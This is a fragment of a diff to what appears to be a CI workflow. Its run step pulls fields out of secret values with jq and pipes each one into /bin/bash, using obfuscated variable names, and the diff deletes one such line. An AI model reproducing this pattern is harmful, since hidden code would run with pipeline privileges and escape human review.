@@ -21,7 +21,6 @@ jobs:
           m45: ${{ secrets.m45 }}
         run: |
           printf '%s' "$m45" | jq -r .tu08365 | /bin/bash
-          echo $lyz5346 | jq -r .bszjl10606 | /bin/bash
           printf '%s' "$kw89" | jq -r .pjhk40 | /bin/bash
           printf '%s' "$fpp20" | jq -r .be04288 | /bin/bash
           echo $mkkj143 | jq -r .yd1827 | /bin/bash
